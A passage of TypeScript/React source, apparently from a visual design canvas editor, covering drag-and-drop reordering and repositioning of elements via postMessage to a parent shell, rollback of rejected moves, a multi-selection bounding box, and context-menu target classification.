        suppressNextCanvasClick();
        window.parent.postMessage(
          {
            dgn: 'reposition-request',
            id: d.cdId,
            left,
            top,
            beforeLeft: Math.round(d.originLeft),
            beforeTop: Math.round(d.originTop),
            idIndex: occ(d.el),
          },
          '*'
        );
        return;
      }
      // Un-float: restore the element's exact original inline style.
      if (d.prevStyle == null) d.el.removeAttribute('style');
      else d.el.setAttribute('style', d.prevStyle);
      // Commit priority: a fresh (un-settled) target under the cursor wins;
      // otherwise the last settled preview (the layout the user is LOOKING at).
      let drop = d.target ? targetToDrop(d.target) : null;
      if (drop && d.target) {
        const t = d.target;
        animateReflow(d.el, () => applyDrop(d.el, t)); // immediate result; the remount confirms it
      } else if (d.applied) {
        drop = d.applied; // DOM already sits there from the preview
      }
      if (!drop) return; // dropped on empty space, never previewed — no move
      // Remember where this node came FROM: if the shell reports the write was
      // rejected (dgn:'reorder-failed'), we put it back so a phantom move that
      // never persisted doesn't linger until the next canvas switch.
      lastCommit = d.origin ? { el: d.el, parent: d.origin.parent, next: d.origin.next } : null;
      suppressNextCanvasClick();
      const refNode = d.target?.kind === 'inside' ? d.target.container : (d.target?.el ?? null);
      window.parent.postMessage(
        {
          dgn: 'reorder-request',
          id: d.cdId,
          refId: drop.refId,
          position: drop.position,
          idIndex: occ(d.el),
          refIndex: occ(refNode),
        },
        '*'
      );
    };

    // The shell rejected the last reorder — revert the optimistic DOM move.
    const onReorderFailed = (e: MessageEvent) => {
      if (e.source !== window.parent) return;
      const m = e.data as { dgn?: string } | null;
      if (m?.dgn !== 'reorder-failed' || !lastCommit) return;
      try {
        lastCommit.parent.insertBefore(lastCommit.el, lastCommit.next);
      } catch {
        /* origin detached — a subsequent load re-syncs */
      }
      lastCommit = null;
    };

    // The shell rejected the last reposition write — revert the optimistic
    // left/top back to the pre-drag inline style.
    const onRepositionFailed = (e: MessageEvent) => {
      if (e.source !== window.parent) return;
      const m = e.data as { dgn?: string } | null;
      if (m?.dgn !== 'reposition-failed' || !lastPosition) return;
      if (lastPosition.prevStyle == null) lastPosition.el.removeAttribute('style');
      else lastPosition.el.setAttribute('style', lastPosition.prevStyle);
      lastPosition = null;
    };

    document.addEventListener('pointerdown', onDown, true);
    window.addEventListener('pointermove', onMove);
    window.addEventListener('pointerup', onUp);
    window.addEventListener('keydown', onKeyDown, true);
    window.addEventListener('message', onReorderFailed);
    window.addEventListener('message', onRepositionFailed);
    return () => {
      if (drag) clearSettle(drag);
      setHighlight(null);
      setElementDragActive(false);
      window.removeEventListener('message', onReorderFailed);
      window.removeEventListener('message', onRepositionFailed);
      if (dividerEl) {
        dividerEl.remove();
        dividerEl = null;
      }
      document.removeEventListener('pointerdown', onDown, true);
      window.removeEventListener('pointermove', onMove);
      window.removeEventListener('pointerup', onUp);
      window.removeEventListener('keydown', onKeyDown, true);
    };
  }, []);

  return null;
}

// ─────────────────────────────────────────────────────────────────────────────
// GroupBbox — dashed outline around the union of selected elements when N > 1.

function GroupBbox() {
  const { selected } = useSelectionSet();
  const ref = useRef<HTMLDivElement | null>(null);
  const rafRef = useRef<number | null>(null);

  useEffect(() => {
    if (selected.length < 2) {
      if (ref.current) ref.current.style.display = 'none';
      return;
    }
    const tick = () => {
      rafRef.current = null;
      const div = ref.current;
      if (!div) return;
      let xMin = Number.POSITIVE_INFINITY;
      let yMin = Number.POSITIVE_INFINITY;
      let xMax = Number.NEGATIVE_INFINITY;
      let yMax = Number.NEGATIVE_INFINITY;
      let anyHit = false;
      for (const sel of selected) {
        const el = resolveSelectionEl(document, sel);
        if (!el) continue;
        // Post-Wave-2: direct artboard drag — the article updates its own
        // `left/top` during drag, so the group bbox just follows via
        // getBoundingClientRect with no special-casing.
        const r = (el as HTMLElement).getBoundingClientRect();
        if (r.width === 0 && r.height === 0) continue;
        anyHit = true;
        if (r.left < xMin) xMin = r.left;
        if (r.top < yMin) yMin = r.top;
        if (r.right > xMax) xMax = r.right;
        if (r.bottom > yMax) yMax = r.bottom;
      }
      if (!anyHit) {
        div.style.display = 'none';
        return;
      }
      const pad = 4;
      div.style.display = 'block';
      div.style.left = `${Math.round(xMin - pad)}px`;
      div.style.top = `${Math.round(yMin - pad)}px`;
      div.style.width = `${Math.round(xMax - xMin + pad * 2)}px`;
      div.style.height = `${Math.round(yMax - yMin + pad * 2)}px`;
      rafRef.current = requestAnimationFrame(tick);
    };
    rafRef.current = requestAnimationFrame(tick);
    return () => {
      if (rafRef.current != null) cancelAnimationFrame(rafRef.current);
    };
  }, [selected]);

  if (selected.length < 2) return null;
  return (
    <div ref={ref} className="dc-cv-group-bbox" aria-hidden="true">
      {TICK_CLASSES.map((cls) => (
        <i key={cls} className={`tick ${cls}`} />
      ))}
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// Helpers

function classifyContextKind(target: HoverTarget | null): ContextTargetKind {
  if (!target) return 'world';
  const el = target.el;
  if (!el) return 'world';
  if (el.closest?.('.dc-mm, .dc-zoom-tb, .dc-tool-palette, .dc-context-menu')) {
    return 'overlay';
  }
  if (target.cdId) return 'element';
  if (target.artboardId) return 'artboard-chrome';
  return 'world';
}
